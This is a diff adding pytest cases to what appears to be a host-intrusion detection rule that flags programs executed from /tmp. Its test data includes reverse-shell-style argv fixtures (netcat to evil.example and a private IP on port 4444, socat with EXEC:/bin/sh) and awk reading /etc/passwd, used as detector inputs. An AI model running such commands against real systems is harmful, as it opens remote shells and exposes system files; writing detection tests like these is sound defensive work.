@@ -381,6 +381,34 @@ def test_exec_from_tmp_absolute_non_temp_path_needs_no_cwd():
     assert playbook.missing_required == 0
 
 
+@pytest.mark.parametrize("argv,executable", [
+    (["nc", "10.0.0.5", "4444"], "/usr/bin/nc"),
+    (["ncat", "evil.example", "443"], "/usr/bin/ncat"),
+    (["netcat", "10.0.0.5", "4444"], "/usr/bin/netcat"),
+    (["socat", "TCP:192.0.2.1:80", "EXEC:/bin/sh"], "/usr/bin/socat"),
+    (["awk", "{print $1}", "/etc/passwd"], "/usr/bin/awk"),
+    (["awk", "/tmp/ {print}", "input"], "/usr/bin/awk"),
+    (["gawk", "/tmp/ {print}", "input"], "/usr/bin/gawk"),
+])
+def test_exec_from_tmp_does_not_treat_data_operands_as_executed_programs(argv, executable):
+    playbook = host.ExecFromTempDir()
+
+    assert playbook.consume([
+        exec_ev(argv, process__executable=executable, process__cwd="/tmp"),
+    ]) == []
+    assert playbook.missing_required == 0
+
+
+@pytest.mark.parametrize("name", ["awk", "gawk"])
+def test_exec_from_tmp_awk_uses_only_dash_f_script_operand(name):
+    matches = run(host.ExecFromTempDir, [
+        exec_ev([name, "-f", "/tmp/tool.awk"], process__executable=f"/usr/bin/{name}", process__cwd="/"),
+    ])
+
+    assert len(matches) == 1
+    assert "'/tmp/tool.awk'" in matches[0].claim
+
+
 @pytest.mark.parametrize("argv,cwd", [
     (["cat", "/tmp/report.txt"], "/home/user"),        # temp path as argument only
     (["./build.sh"], "/home/user/src"),                # relative exec outside temp
